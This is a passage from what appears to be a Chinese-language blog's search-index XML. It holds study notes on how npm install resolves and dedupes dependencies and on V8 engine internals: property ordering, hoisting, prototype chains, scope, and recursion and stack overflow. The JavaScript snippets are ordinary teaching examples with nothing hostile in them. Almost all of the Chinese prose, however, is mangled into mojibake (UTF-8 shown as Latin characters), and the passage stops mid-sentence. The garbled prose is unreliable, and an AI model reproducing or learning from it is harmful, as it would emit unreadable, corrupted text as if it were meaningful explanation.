é‡å˜æ›´å¾ˆå¯èƒ½æ˜¯å·¨å¤§çš„ã€‚</p><p><br></p><h3 id="4-è¾“å…¥npm-installä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"><a href="#4-è¾“å…¥npm-installä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ" class="headerlink" title="4. è¾“å…¥npm installä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"></a>4. è¾“å…¥<em><code>npm install</code></em>ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</h3><ol><li>æ‰§è¡Œå·¥ç¨‹è‡ªèº«<em><code>preinstall</code></em>é’©å­</li><li>ç¡®å®šé¦–å±‚ä¾èµ–<br>æ‰¾åˆ°<em><code>dependencies</code></em> å’Œ <em><code>devDependencies</code></em> å±æ€§ä¸­ç›´æ¥æŒ‡å®šçš„æ¨¡å—ã€‚å¼€å¯å¤šè¿›ç¨‹ä»æ¯ä¸ªé¦–å±‚ä¾èµ–æ¨¡å—å¼€å§‹é€æ­¥å¯»æ‰¾æ›´æ·±å±‚çº§çš„èŠ‚ç‚¹ã€‚</li><li><p>è·å–æ¨¡å—</p><ul><li>ã€ç¡®å®šåŒ…ç‰ˆæœ¬ã€‘ å¦‚æœ<em><code>npm-shrinkwrap.json</code></em>æˆ–<em><code>package-lock.json</code></em>ä¸­æœ‰è¯¥æ¨¡å—ä¿¡æ¯ç›´æ¥æ‹¿ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä»<em><code>package.json</code></em>ä¸­è·å–ã€‚<strong>æŸä¸ªåŒ…çš„ç‰ˆæœ¬æ˜¯ ^1.1.0ï¼Œnpm å°±ä¼šå»ä»“åº“ä¸­è·å–ç¬¦åˆ 1.x.x å½¢å¼çš„æœ€æ–°ç‰ˆæœ¬ã€‚</strong></li><li>ã€è·å–åŒ…ã€‘æŸ¥è¯¢<em><code>node_modules</code></em>ç›®å½•ä¸­æ˜¯å¦å·²ç»å­˜åœ¨æŒ‡å®šæ¨¡å—<ul><li>è‹¥å­˜åœ¨ï¼Œä¸å†é‡æ–°å®‰è£…</li><li>è‹¥ä¸å­˜åœ¨<ul><li>npmå‘registryæŸ¥è¯¢æ¨¡å—å‹ç¼©åŒ…çš„ç½‘å€</li><li>ä¸‹è½½å‹ç¼©åŒ…ï¼Œå­˜æ”¾åœ¨æ ¹ç›®å½•ä¸‹çš„<em><code>.npm</code></em>ç›®å½•é‡Œ</li><li>è§£å‹å‹ç¼©åŒ…åˆ°å½“å‰é¡¹ç›®çš„<em><code>node_modules</code></em>ç›®å½•</li></ul></li></ul></li><li>ã€æŸ¥æ‰¾è¯¥æ¨¡å—ä¾èµ–ã€‘å¦‚æœæœ‰ä¾èµ–åˆ™å›åˆ°ç¬¬1æ­¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™åœæ­¢ã€‚</li></ul></li><li><p>æ¨¡å—æ‰å¹³åŒ–<br>ä¸€ä¸ªé¡¹ç›®é‡Œé¢å¯èƒ½ä¼šåŒ…å«å¤§é‡é‡å¤æ¨¡å—ã€‚Aæ¨¡å—ä¾èµ–äºlodashï¼ŒBæ¨¡å—ä¹Ÿä¾èµ–äºlodashã€‚ä» npm3 å¼€å§‹é»˜è®¤åŠ å…¥äº†ä¸€ä¸ª dedupe çš„è¿‡ç¨‹ã€‚å®ƒä¼šéå†æ‰€æœ‰èŠ‚ç‚¹ï¼Œé€ä¸ªå°†æ¨¡å—æ”¾åœ¨æ ¹èŠ‚ç‚¹ä¸‹é¢ï¼Œä¹Ÿå°±æ˜¯ node-modules çš„ç¬¬ä¸€å±‚ã€‚å½“å‘ç°æœ‰é‡å¤æ¨¡å—æ—¶ï¼Œåˆ™å°†å…¶ä¸¢å¼ƒã€‚</p></li></ol><p><br></p><h3 id="5-ç‰ˆæœ¬å·çº¦å®š"><a href="#5-ç‰ˆæœ¬å·çº¦å®š" class="headerlink" title="5. ç‰ˆæœ¬å·çº¦å®š"></a>5. ç‰ˆæœ¬å·çº¦å®š</h3><p>å› ä¸ºnpmé‡‡ç”¨äº†è¯­ä¹‰åŒ–ç‰ˆæœ¬çº¦å®šï¼Œç®€å•æ¥è¯´ï¼Œa.b.cä»£è¡¨ç€</p><ul><li>a ä¸»ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†ä¸å…¼å®¹çš„ API ä¿®æ”¹</li><li>b æ¬¡ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„åŠŸèƒ½æ€§æ–°å¢</li><li>c ä¿®è®¢å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„é—®é¢˜ä¿®æ­£</li></ul><p><em>Qï¼šAæ¨¡å—ä¾èµ–äºlodash1.0.0ï¼ŒBæ¨¡å—ä¹Ÿä¾èµ–äºlodash2.0.0ï¼Œæœ€åå®‰è£…çš„lodashä¼šæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼Ÿ</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾æˆ‘ä»¬çš„ä¾èµ–æ ‘å¦‚ä¸‹</span></span><br><span class="line">node_modules</span><br><span class="line">- foo</span><br><span class="line">-- lodash@version1</span><br><span class="line">- bar</span><br><span class="line">-- lodash@version2</span><br></pre></td></tr></table></figure></p><p>foo æ¨¡å—ä¾èµ– lodash@^1.0.0<br>bar æ¨¡å—ä¾èµ– lodash@^1.1.0<br>åˆ™ ^1.1.0 ä¸ºå…¼å®¹ç‰ˆæœ¬ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å­˜åœ¨å…¼å®¹ç‰ˆæœ¬</span></span><br><span class="line">- foo</span><br><span class="line">- bar</span><br><span class="line">- lodash <span class="comment">// ä¿ç•™ç‰ˆæœ¬ä¸ºå…¼å®¹ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure></p><p>foo ä¾èµ– lodash@^2.0.0<br>bar ä¾èµ– lodash@^1.1.0<br>äºŒè€…ä¸å­˜åœ¨å…¼å®¹ç‰ˆæœ¬ã€‚ä¼šå°†ä¸€ä¸ªç‰ˆæœ¬æ”¾åœ¨ node_modules ä¸­ï¼Œå¦ä¸€ä¸ªä»ä¿ç•™åœ¨ä¾èµ–æ ‘é‡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸å­˜åœ¨å…¼å®¹ç‰ˆæœ¬</span></span><br><span class="line">node_modules</span><br><span class="line">- foo</span><br><span class="line">- lodash@version1</span><br><span class="line">- bar</span><br><span class="line">-- lodash@version2</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/22" target="_blank" rel="noopener">ä»‹ç»ä¸‹ npm æ¨¡å—å®‰è£…æœºåˆ¶ï¼Œä¸ºä»€ä¹ˆè¾“å…¥ npm install å°±å¯ä»¥è‡ªåŠ¨å®‰è£…å¯¹åº”çš„æ¨¡å—ï¼Ÿ</a></li><li><a href="https://github.com/SamHwang1990/blog/issues/7#issue-207283826" target="_blank" rel="noopener">æµ…è°ˆnpm çš„ä¾èµ–ä¸ç‰ˆæœ¬</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>V8å¼•æ“</title>
      <link href="/2021/07/15/V8%E5%BC%95%E6%93%8E/"/>
      <url>/2021/07/15/V8%E5%BC%95%E6%93%8E/</url>
      <content type="html"><![CDATA[<h3 id="1-å‡½æ•°å³å¯¹è±¡"><a href="#1-å‡½æ•°å³å¯¹è±¡" class="headerlink" title="1. å‡½æ•°å³å¯¹è±¡"></a>1. å‡½æ•°å³å¯¹è±¡</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µä»£ç ï¼Œè¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°<code>foo</code>ï¼Œæ¥ç€åˆç»™<code>foo</code>å‡½æ•°è®¾ç½®äº†<code>myName</code>å±æ€§ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo'</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo.myName = <span class="number">1</span></span><br><span class="line">foo.obj = &#123; <span class="attr">x</span>: <span class="number">1</span> &#125;</span><br><span class="line">foo.fun = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.myName) <span class="comment">// 1</span></span><br><span class="line">foo() <span class="comment">// foo</span></span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬æ—¢å¯ä»¥ç»™<code>foo</code>æ·»åŠ å±æ€§ï¼Œæœ‰å¯ä»¥å®ç°è°ƒç”¨<code>foo</code>ã€‚å› ä¸ºåœ¨V8å†…éƒ¨ï¼Œä¼šä¸ºå‡½æ•°å¯¹è±¡æ·»åŠ ä¸¤ä¸ªéšè—å±æ€§<code>name</code>å’Œ<code>code</code>ï¼Œcodeçš„å€¼æ˜¯å‡½æ•°ä»£ç ï¼Œå½“æ‰§è¡Œå‡½æ•°è°ƒç”¨è¯­å¥æ—¶ï¼ŒV8ä¼šä»å‡½æ•°å¯¹è±¡ä¸­å–å‡º<code>code</code>å±æ€§å€¼ï¼Œç„¶åæ‰§è¡Œè¿™æ®µå‡½æ•°ã€‚</p><p><img src="/2021/07/15/V8å¼•æ“/2.jpg"></p><p>å› ä¸ºå‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯¹è±¡ï¼Œæ‰€ä»¥åœ¨ JavaScript ä¸­ï¼Œå‡½æ•°å¯ä»¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼Œè¿˜å¯ä»¥ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚</p><h3 id="2-å¿«å±æ€§å’Œæ…¢å±æ€§"><a href="#2-å¿«å±æ€§å’Œæ…¢å±æ€§" class="headerlink" title="2. å¿«å±æ€§å’Œæ…¢å±æ€§"></a>2. å¿«å±æ€§å’Œæ…¢å±æ€§</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">100</span>] = <span class="string">'test-100'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="string">'test-1'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"B"</span>] = <span class="string">'bar-B'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">50</span>] = <span class="string">'test-50'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] =  <span class="string">'test-9'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="string">'test-8'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="string">'test-3'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="string">'test-5'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"A"</span>] = <span class="string">'bar-A'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"C"</span>] = <span class="string">'bar-C'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> Foo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> bar)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`index:<span class="subst">$&#123;key&#125;</span>  value:<span class="subst">$&#123;bar[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* æ‰“å°ç»“æœ: æ•°å­—å±æ€§è¢«æœ€å…ˆæ‰“å°å‡ºæ¥ï¼Œä¸”æ˜¯æŒ‰ç…§æ•°å­—å¤§å°çš„é¡ºåºæ‰“å°ï¼›å­—ç¬¦ä¸²å±æ€§æ˜¯æŒ‰ç…§è®¾ç½®é¡ºåºæ‰“å°çš„ã€‚</span></span><br><span class="line"><span class="comment">index:1  value:test-1</span></span><br><span class="line"><span class="comment">index:3  value:test-3</span></span><br><span class="line"><span class="comment">index:5  value:test-5</span></span><br><span class="line"><span class="comment">index:8  value:test-8</span></span><br><span class="line"><span class="comment">index:9  value:test-9</span></span><br><span class="line"><span class="comment">index:50  value:test-50</span></span><br><span class="line"><span class="comment">index:100  value:test-100</span></span><br><span class="line"><span class="comment">index:B  value:bar-B</span></span><br><span class="line"><span class="comment">index:A  value:bar-A</span></span><br><span class="line"><span class="comment">index:C  value:bar-C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥å‡ºç°è¿™æ ·çš„ç»“æœï¼Œæ˜¯å› ä¸ºåœ¨ ECMAScript è§„èŒƒä¸­å®šä¹‰äº†<strong>æ•°å­—å±æ€§</strong>åº”è¯¥æŒ‰ç…§ç´¢å¼•å€¼å¤§å°å‡åºæ’åˆ—ï¼Œ<strong>å­—ç¬¦ä¸²å±æ€§</strong>æ ¹æ®åˆ›å»ºæ—¶çš„é¡ºåºå‡åºæ’åˆ—ã€‚</p><p>åœ¨ V8 å†…éƒ¨ï¼Œä¸ºäº†æœ‰æ•ˆåœ°æå‡å­˜å‚¨å’Œè®¿é—®è¿™ä¸¤ç§å±æ€§çš„æ€§èƒ½ï¼Œåˆ†åˆ«ä½¿ç”¨äº†ä¸¤ä¸ªçº¿æ€§æ•°æ®ç»“æ„æ¥åˆ†åˆ«ä¿å­˜<strong>æ•°å­—å±æ€§ element</strong>å’Œ<strong>å­—ç¬¦ä¸²å±æ€§ properties</strong>ã€‚</p><p><a href="https://www.cnblogs.com/chargeworld/p/12236848.html" target="_blank" rel="noopener">https://www.cnblogs.com/chargeworld/p/12236848.html</a></p><h3 id="3-å‡½æ•°å£°æ˜-å’Œ-å‡½æ•°è¡¨è¾¾å¼"><a href="#3-å‡½æ•°å£°æ˜-å’Œ-å‡½æ•°è¡¨è¾¾å¼" class="headerlink" title="3. å‡½æ•°å£°æ˜ å’Œ å‡½æ•°è¡¨è¾¾å¼"></a>3. å‡½æ•°å£°æ˜ å’Œ å‡½æ•°è¡¨è¾¾å¼</h3><ul><li><strong>å‡½æ•°å£°æ˜</strong>çš„æœ¬è´¨æ˜¯è¯­å¥ï¼Œè€Œ<strong>å‡½æ•°è¡¨è¾¾å¼</strong>çš„æœ¬è´¨åˆ™æ˜¯è¡¨è¾¾å¼ã€‚</li><li><p>åœ¨ç¼–è¯‘é˜¶æ®µï¼Œç¢°åˆ°å˜é‡ï¼ŒV8ä¼šå°†å˜é‡æå‡åˆ°ä½œç”¨åŸŸä¸­æ—¶ï¼Œè¿˜ä¼šä¸ºå…¶è®¾ç½®é»˜è®¤å€¼ undefinedã€‚å¦‚æœæ˜¯å‡½æ•°å£°æ˜ï¼Œåˆ™ä¼šåœ¨å†…å­˜ä¸­åˆ›å»ºè¯¥å‡½æ•°å¯¹è±¡ï¼Œå¹¶æå‡æ•´ä¸ªå‡½æ•°å¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(x)   <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// å®Œæ•´çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>å‡½æ•°ç«‹å³è¡¨ç¤ºå¼å¯ä»¥ç”¨æ¥å°è£…ä¸€äº›å˜é‡ï¼Œå‡½æ•°ï¼Œèµ·åˆ°éš”ç¦»å’Œä»£ç éšè—çš„ä½œç”¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    n = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(n);</span><br><span class="line">&#125;())</span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line"><span class="comment">// 100</span></span><br><span class="line"><span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    n = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line">foo()</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 100</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-åŸå‹é“¾"><a href="#4-åŸå‹é“¾" class="headerlink" title="4. åŸå‹é“¾"></a>4. åŸå‹é“¾</h3><p>ç»§æ‰¿å°±æ˜¯ä¸€ä¸ªå¯¹è±¡å¯ä»¥è®¿é—®å¦å¤–ä¸€ä¸ªå¯¹è±¡ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>JavaScript çš„æ¯ä¸ªå¯¹è±¡éƒ½åŒ…å«äº†ä¸€ä¸ªéšè—å±æ€§ <code>__proto__</code> ï¼Œæˆ‘ä»¬å°±æŠŠè¯¥éšè—å±æ€§ <code>__proto__</code> ç§°ä¹‹ä¸ºè¯¥å¯¹è±¡çš„åŸå‹ (prototype), <code>__proto__</code> æŒ‡å‘äº†å†…å­˜ä¸­çš„å¦å¤–ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å°±æŠŠ <code>__proto__</code> æŒ‡å‘çš„å¯¹è±¡ç§°ä¸ºè¯¥å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å°±å¯ä»¥ç›´æ¥è®¿é—®å…¶åŸå‹å¯¹è±¡çš„æ–¹æ³•æˆ–è€…å±æ€§ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DogFactory</span>(<span class="params">type,color</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type = type</span><br><span class="line">  <span class="keyword">this</span>.color = color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> DogFactory(<span class="string">'Dog'</span>,<span class="string">'Black'</span>)</span><br></pre></td></tr></table></figure><p>å½“V8æ‰§è¡Œä¸Šé¢çš„ä»£ç æ—¶ï¼Œå…¶å®æ‚„æ‚„åšäº†ä»¥ä¸‹å‡ ä»¶äº‹æƒ…<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dog = &#123;&#125;</span><br><span class="line">dog.__proto__ = DogFactory.prototype</span><br><span class="line">DogFactory.call(dog, <span class="string">'Dog'</span>, <span class="string">'Black'</span>)</span><br></pre></td></tr></table></figure></p><p>æ¯ä¸ªå‡½æ•°å¯¹è±¡ä¸­éƒ½æœ‰ä¸€ä¸ªå…¬å¼€çš„<code>prototype</code>å±æ€§ï¼Œå½“ä½ è®²è¿™ä¸ªå‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°æ¥åˆ›å»ºæ–°å¯¹è±¡æ—¶ï¼Œæ–°åˆ›å»ºå¯¹è±¡çš„åŸå‹å¯¹è±¡å°±æŒ‡å‘äº†è¯¥å‡½æ•°çš„<code>prototype</code>å±æ€§ã€‚</p><p><a href="https://juejin.im/post/5cc99fdfe51d453b440236c3" target="_blank" rel="noopener">https://juejin.im/post/5cc99fdfe51d453b440236c3</a></p><h3 id="5-ä½œç”¨åŸŸé“¾"><a href="#5-ä½œç”¨åŸŸé“¾" class="headerlink" title="5. ä½œç”¨åŸŸé“¾"></a>5. ä½œç”¨åŸŸé“¾</h3><p>ä½œç”¨åŸŸå°±æ˜¯å­˜æ”¾å˜é‡å’Œå‡½æ•°çš„åœ°æ–¹ã€‚ä½œç”¨åŸŸé“¾å°±æ˜¯å°†ä¸€ä¸ªä¸ªä½œç”¨åŸŸä¸²èµ·æ¥ï¼Œå®ç°å˜é‡æŸ¥æ‰¾çš„è·¯å¾„ã€‚</p><p>å…¨å±€ä½œç”¨åŸŸæ˜¯åœ¨ V8 å¯åŠ¨è¿‡ç¨‹ä¸­å°±åˆ›å»ºäº†ï¼Œä¸”ä¸€ç›´ä¿å­˜åœ¨å†…å­˜ä¸­ä¸ä¼šè¢«é”€æ¯çš„ï¼Œç›´è‡³ V8 é€€å‡ºã€‚ è€Œå‡½æ•°ä½œç”¨åŸŸæ˜¯åœ¨æ‰§è¡Œè¯¥å‡½æ•°æ—¶åˆ›å»ºçš„ï¼Œå½“å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åï¼Œå‡½æ•°ä½œç”¨åŸŸå°±éšä¹‹è¢«é”€æ¯æ‰äº†ã€‚</p><h3 id="6-è¿è¡Œæ—¶ç¯å¢ƒ"><a href="#6-è¿è¡Œæ—¶ç¯å¢ƒ" class="headerlink" title="6. è¿è¡Œæ—¶ç¯å¢ƒ"></a>6. è¿è¡Œæ—¶ç¯å¢ƒ</h3><ul><li>æ ˆç©ºé—´ï¼šç”¨æ¥ç®¡ç† JavaScript å‡½æ•°è°ƒç”¨çš„</li></ul><h3 id="7-å‡½æ•°è°ƒç”¨æ—¶å¦‚ä½•å½±å“å†…å­˜å¸ƒå±€çš„ï¼Ÿ"><a href="#7-å‡½æ•°è°ƒç”¨æ—¶å¦‚ä½•å½±å“å†…å­˜å¸ƒå±€çš„ï¼Ÿ" class="headerlink" title="7. å‡½æ•°è°ƒç”¨æ—¶å¦‚ä½•å½±å“å†…å­˜å¸ƒå±€çš„ï¼Ÿ"></a>7. å‡½æ•°è°ƒç”¨æ—¶å¦‚ä½•å½±å“å†…å­˜å¸ƒå±€çš„ï¼Ÿ</h3><p>å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…¶å†…éƒ¨çš„ä¸´æ—¶å˜é‡ä¼šæŒ‰ç…§æ‰§è¡Œé¡ºåºè¢«å‹å…¥åˆ°æ ˆä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. åœ¨åŒä¸€ä»»åŠ¡ä¸­é‡å¤è°ƒç”¨åµŒå¥—çš„fooå‡½æ•°ï¼Œå‘ç”Ÿæ ˆæº¢å‡º</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  foo()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä½¿ç”¨setTimeoutè®©fooå‡½æ•°åœ¨ä¸åŒçš„ä»»åŠ¡ä¸­æ‰§è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(foo, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. åœ¨åŒä¸€ä»»åŠ¡ä¸­æ‰§è¡Œfooï¼Œä½†ä¸æ˜¯åµŒå¥—æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">// ä¸»çº¿ç¨‹é€šè¿‡ä¸€ä¸ªwhileå¾ªç¯ï¼Œä¸€ç›´æ‹‰å–å¾®ä»»åŠ¡ï¼Œè¿™æ ·çš„å¾ªç¯ä¼šä¸æ–­åˆ›å»ºæ ˆï¼Œå†é”€æ¯æ ˆï¼Œæ‰€ä»¥ä¸ä¼šçˆ†æ ˆï¼Œä½†æ˜¯å› ä¸ºåœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œæ‰€ä»¥é¡µé¢ä¼šå¡æ­»ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve().then(foo)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p><h3 id="8-æƒ°æ€§è§£æ"><a href="#8-æƒ°æ€§è§£æ" class="headerlink" title="8. æƒ°æ€§è§£æ"></a>8. æƒ°æ€§è§£æ</h3><p>V8ä¸ä¼šä¸€æ¬¡æ€§å°†æ‰€æœ‰çš„JSè§£æä¸ºä¸­é—´ä»£ç ã€‚</p><ul><li><p>é¦–å…ˆï¼Œå¦‚æœä¸€æ¬¡è§£æå’Œç¼–è¯‘æ‰€æœ‰çš„ JavaScript ä»£ç ï¼Œè¿‡å¤šçš„ä»£ç ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ï¼Œè¿™ä¼šä¸¥é‡å½±å“åˆ°é¦–æ¬¡æ‰§è¡Œ JavaScript ä»£ç çš„é€Ÿåº¦ï¼Œè®©ç”¨æˆ·æ„Ÿè§‰åˆ°å¡é¡¿ã€‚å› ä¸ºæœ‰æ—¶å€™ä¸€ä¸ªé¡µé¢çš„ JavaScript ä»£ç éƒ½æœ‰ 10 å¤šå…†ï¼Œå¦‚æœè¦å°†æ‰€æœ‰çš„ä»£ç ä¸€æ¬¡æ€§è§£æç¼–è¯‘å®Œæˆï¼Œé‚£ä¹ˆä¼šå¤§å¤§å¢åŠ ç”¨æˆ·çš„ç­‰å¾…æ—¶é—´ï¼›</p></li><li><p>å…¶æ¬¡ï¼Œè§£æå®Œæˆçš„å­—èŠ‚ç å’Œç¼–è¯‘ä¹‹åçš„æœºå™¨ä»£ç éƒ½ä¼šå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå¦‚æœä¸€æ¬¡æ€§è§£æå’Œç¼–è¯‘æ‰€æœ‰ JavaScript ä»£ç ï¼Œé‚£ä¹ˆè¿™äº›ä¸­é—´ä»£ç å’Œæœºå™¨ä»£ç å°†ä¼šä¸€ç›´å 